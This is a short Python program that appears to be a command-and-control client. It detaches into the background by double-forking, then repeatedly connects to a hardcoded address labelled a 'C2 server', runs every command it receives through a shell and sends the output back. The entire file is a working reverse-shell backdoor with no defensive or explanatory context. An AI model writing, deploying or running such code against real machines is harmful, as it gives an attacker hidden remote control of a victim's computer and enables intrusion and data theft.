import socket
import subprocess
import os
import sys
import time

def daemonize():
    """Run the client in the background by forking the process."""

    try:
        pid = os.fork()
        if pid > 0:
            # Parent process exits
            sys.exit(0)
    except OSError as e:
        print(f"[!] Fork failed: {e}")
        sys.exit(1)

    # Child process
    os.setsid()  # Create new session

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] Second fork failed: {e}")
        sys.exit(1)

def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('192.168.1.6', 5666))
            print("[*] connected to C2 server")
            while True:
                command = client.recv(4096).decode('utf-8', errors='ignore')
                if not command:
                    break
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Error: {str(e)}"
                client.send(output.encode('utf-8'))
        except Exception as e:
            print(f"[!] connection error: {e}")
            time.sleep(5)
        finally:
            client.close()

if __name__ == "__main__":
    daemonize()
    connect_to_server()
